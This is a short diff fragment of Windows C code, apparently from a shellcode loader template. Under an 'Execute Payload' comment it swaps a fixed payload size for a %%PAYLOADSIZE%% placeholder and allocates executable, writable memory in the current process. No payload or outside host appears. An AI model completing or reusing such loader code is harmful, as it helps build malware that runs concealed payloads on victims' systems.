@@ -181,8 +181,8 @@ INT wmain()
     //Execute Payload
     LPVOID addr = NULL;
     size_t keySize = 16;
-    size_t payloadSize = 276;
-    size_t buffSize = 276;
+    size_t payloadSize = %%PAYLOADSIZE%%;
+    size_t buffSize = %%PAYLOADSIZE%%;
     HANDLE hProc = GetCurrentProcess();
     HANDLE thandle = NULL;
     pAlloc(hProc, &addr, 0, &buffSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
